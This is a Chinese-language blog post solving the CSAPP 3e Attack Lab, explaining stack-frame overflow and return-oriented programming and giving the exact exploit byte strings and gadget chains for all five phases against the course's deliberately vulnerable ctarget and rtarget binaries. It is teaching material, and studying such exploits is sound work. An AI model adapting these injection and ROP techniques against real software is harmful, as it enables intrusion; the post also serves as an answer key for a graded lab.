---
title: 《CSAPP》实验三：缓冲区溢出攻击
date: 2018-12-19 21:56:30
tags:
    - CSAPP
---

缓冲区溢出攻击也是第三章的配套实验，实验提供了两个有缓冲区溢出漏洞的x86-64程序([CSAPP 3e: Attack Lab](http://csapp.cs.cmu.edu/3e/target1.tar))，要求我们设计“恶意输入”，利用程序漏洞，实现指令注入，执行未授权代码。两个漏洞程序：ctarget 和 rtarget。ctarget 对运行时栈无保护，既没有栈地址随机化，也允许执行栈上的指令，十分容易攻击。rtarget 则开启了栈地址随机化，且不允许执行栈上的指令，因此无法利用指令注入，对它的攻击被称为return-oriented programming (ROP)，要利用到程序中原有的一些特殊的字节序列：gadget。<!-- more -->

# 原理

程序用运行时栈(runtime stack)实现C语言中“函数”的概念。调用一个函数所需的栈空间被称为栈帧，按地址从大往小，从栈底往栈顶看，一个栈帧中依次保存了寄存器，局部变量，调用其他函数所需的参数，返回地址等，如下图所示(《CSAPP》图3-25)。函数执行完跳转回调用方，需要执行`ret`指令，`ret`可分为两步：一是从栈中弹出返回地址；二是设置程序计数器(Program Counter)`%rip`，将控制流转移到弹出的返回地址。当程序在栈上的缓冲区溢出，返回地址就可能被篡改，使得控制流跳转到未授权的指令。通过设计恶意输入，还能够在栈上注入指令，执行攻击者的非法操作。

<img src="/csapp-attacklab/stack-frame.png" width="320px" height="480px" alt="栈帧结构" title="栈帧结构">

`objdump -d ctarget > ctarget.d`，导出实验给出的的有缓存区溢出危险的函数如下。可以看到缓冲区大小为0x28，因此设计恶意输入时，要先用40字节写满缓冲区，下文就不再浪费笔墨写这40字节了。由于缓冲区是从栈顶向栈底写入的，且`getbuf`没有保存寄存器，看上面的栈帧结构图就知道，填满缓冲区之后，溢出的部分可以直接覆盖返回地址，这是攻击的基础。

```assembly
00000000004017a8 <getbuf>:
  4017a8:   48 83 ec 28             sub    $0x28,%rsp
  4017ac:   48 89 e7                mov    %rsp,%rdi
  4017af:   e8 8c 02 00 00          callq  401a40 <Gets>
  4017b4:   b8 01 00 00 00          mov    $0x1,%eax
  4017b9:   48 83 c4 28             add    $0x28,%rsp
  4017bd:   c3                      retq
  4017be:   90                      nop
  4017bf:   90                      nop
```

实验提供了详细的说明，见[attacklab.pdf](http://csapp.cs.cmu.edu/3e/attacklab.pdf)。ctarget和rtarget包含了3个相同的目标函数：`touch1`，`touch2`和`touch3`。实验要求设计恶意输入，在栈上修改`getbuf`的返回地址并设计参数，调用这3个目标函数(rtarget不需要调用`touch1`)，`cookie`是实验提供的一个标识值，0x59b997fa。

```c
void touch1()
{
    vlevel = 1; /* Part of validation protocol */
    printf("Touch1!: You called touch1()\n");
    validate(1);
    exit(0);
}

void touch2(unsigned val)
{
    vlevel = 2; /* Part of validation protocol */
    if (val == cookie) {
        printf("Touch2!: You called touch2(0x%.8x)\n", val);
        validate(2);
    } else {
        printf("Misfire: You called touch2(0x%.8x)\n", val);
        fail(2);
    }
    exit(0);
}

void touch3(char *sval)
{
    vlevel = 3; /* Part of validation protocol */
    if (hexmatch(cookie, sval)) {
        printf("Touch3!: You called touch3(\"%s\")\n", sval);
        validate(3);
    } else {
        printf("Misfire: You called touch3(\"%s\")\n", sval);
        fail(3);
    }
    exit(0);
}
```

# ctarget

## phase_1

* 反汇编ctarget，`objdump -d ctarget > ctarget.d`
* 找到`touch1`的入口地址为`0x004017c0`
* 注意先填满40字节缓冲区，且缓冲区是由栈顶向栈底写入的，地址应该从低字节向高字节写
* 保存答案为`phase_1`，检查答案执行`./hex2raw < phase_1 | ./ctarget -q`

```c
// 栈顶(低地址)
// 40 字节，写满缓冲区
c0 17 40 00 00 00 00 00
// 栈顶(高地址)
```

## phase_2

* 总的来说，要构造这样的一个恶意输入：

```c
// 栈顶(低地址)
// 40 字节，写满缓冲区
// <-- getbuf 开始执行 ret 时，%rsp 的位置
注入的指令的地址
// <-- getbuf 执行完 ret 时，%rsp 的位置
touch2 的地址
movl $cookie, %edi
ret
// 栈顶(高地址)
```

* ctarget 没有随机化栈地址，gdb在`getbuf`的`ret`指令设断点，取到`%rsp`的值
* `注入的指令的地址` 应为 `%rsp + 0x10`，为 `0x5561dcb0`
* `touch2`地址为`0x004017ec`
* `movl $0x59b997fa, %edi` 机器码为 `bf fa 97 b9 59`，`ret` 机器码为 `c3`
* 综上，答案如下：

```c
// 栈顶(低地址)
// 40 字节，写满缓冲区
b0 dc 61 55 00 00 00 00
ec 17 40 00 00 00 00 00
bf fa 97 b9 59
c3
// 栈顶(高地址)
```

## phase_3

* `touch3`的参数是字符串，需要在栈上存储字符串
* 栈是向下（低地址）增长的，为了避免字符串参数被覆盖，其地址应高于返回地址，思路如下：

```c
// 栈顶(低地址)
// 40 字节，写满缓冲区
// <-- getbuf 开始执行 ret 时，%rsp 的位置
注入的指令的地址
// <-- getbuf 执行完 ret 时，%rsp 的位置
touch3 的地址
cookie 字符串
// getbuf 执行完 ret 时，cookie 字符串地址为 %rsp + 0x8
leaq 0x8(%rsp), %rdi
ret
// 栈顶(高地址)
```

* 同phase_2，gdb在`getbuf`的`ret`指令设断点，取到`%rsp`的值
* `注入的指令的地址` 应为 `%rsp + 0x20`，`0x20`为两个地址加字符串长度，为`0x5561dcc0`
* `touch3`地址为 `0x004018fa`
* `python -c "print(' '.join(hex(ord(i))[2:] for i in '59b997fa'))"`
* 将cookie转为其ASCII的十六进制表示
* 注意C字符串以0结尾，为了方便计算补了8个字节0，这也是上面0x20的来源
* `leaq 0x8(%rsp), %rdi`机器码`48 8d 7c 24 08`，综上，答案：

```c
// 栈顶(低地址)
// 40 字节，写满缓冲区
c0 dc 61 55 00 00 00 00
fa 18 40 00 00 00 00 00
35 39 62 39 39 37 66 61  // 字符串
00 00 00 00 00 00 00 00  // 字符串结尾，8个字节方便计算
48 8d 7c 24 08
c3 // ret
// 栈顶(高地址)
```

# rtarget

与ctarget相比，对rtarget的攻击存在两个难点:

* 引入了栈地址随机化，无法像攻击ctarget那样取得栈地址的绝对值。
* 栈上的指令不可执行，即使在栈注入指令，执行了也是 segmentation fault。

第一点可以通过相对地址，即 `%rsp + offset` 的方式解决。
第二点则要利用rtarget中原有的特殊字节序列：gadget。上文的实验说明给了一个例子，程序中有这样的一个函数：

```assembly
0000000000400f15 <setval_210>:
400f15: c7 07 d4 48 89 c7 movl $0xc78948d4,(%rdi)
400f1b: c3 retq
```

其中`48 89 c7`是`movq %rax, %rdi`的机器码，后面接着`c3`，即`retq`。缓冲区溢出，改写`getbuf`的返回地址为`48 89 c7`的地址(0x400f18)，就能执行`movq %rax, %rdi`这条指令，接着`retq`，使得攻击者可以继续利用上述过程执行攻击指令。以上攻击手段被称为return-oriented programming，`48 89 c7 c3`就是一个"gadget"。实验给出了所有可利用的gadget的源码，在farm.c，[attacklab.pdf](http://csapp.cs.cmu.edu/3e/attacklab.pdf)列出了rtarget中所有gadget及对应的指令。

## phase_4

* phase_4 要求调用`touch2`，需要传参，可以先把参数写入栈，再利用gadget `popq %rdi`
* 搜索发现gadget farm没有 `popq %rdi`，只有 `popq %rax`和`movq %rax, %rdi`
* 找到`popq %rax`和`movq %rax, %rdi`地址分别为0x004019cc，0x004019a2

```c
// 栈顶(低地址)
// 40 字节，写满缓冲区

// <-- getbuf 开始执行 ret 时，%rsp 的位置
cc 19 40 00 00 00 00 00 // gadget "popq %rax" 地址

// <-- popq %rax 开始执行时，%rsp 的位置
fa 97 b9 59 00 00 00 00 // cookie

// <-- gadget "popq %rax" 开始执行 ret 时，%rsp 的位置
a2 19 40 00 00 00 00 00 // gadget "movq %rax, %rdi" 地址

// <-- gadget "movq %rax, %rdi"  开始执行 ret 时，%rsp 的位置
ec 17 40 00 00 00 00 00 // touch2 地址

// 栈顶(高地址)
```

## phase_5

* `touch3`的参数是字符串，这要求我们在栈上存储字符串，且要取得字符串的地址
* 由于栈地址随机化，只能相对寻址，需要类似`leaq $offset(%rsp), %rdi`的指令
* 搜索gadget farm发现只有`lea (%rdi, %rsi, 1), %rax`
* 所以`$offset`也要放到栈上，再`popq %rdi`或`popq %rsi`
* 注意取栈地址时，`%rsp`不能作为`movl`的操作数，`movl`会对高位4字节补零
* 字符串地址必须比`touch3`返回地址高，否则会被覆盖
* `$offset`为字符串地址相对于`getbuf`开始执行时的栈地址的偏移值，为0x48
* farm上的指令有限，需要做一些转换，综上，答案如下：

```c
// 栈顶(低地址)
// 40 字节，写满缓冲区
// <-- getbuf 开始执行 ret 时，%rsp 的位置
movq %rsp, %rax             // 0x00401a06
movq %rax, %rdi             // 0x004019a2
popq %rax                   // 0x004019ab
// <-- "popq %rax" 开始执行时，%rsp 的位置
// $offset
movl %eax, %edx             // 0x004019dd
movl %edx, %ecx             // 0x00401a34
movl %ecx, %esi             // 0x00401a13
leaq (%rdi, %rsi, 1), %rax  // 0x004019d6
movq %rax, %rdi             // 0x004019a2
// touch3 地址 0x004018fa
// cookie 字符串
```
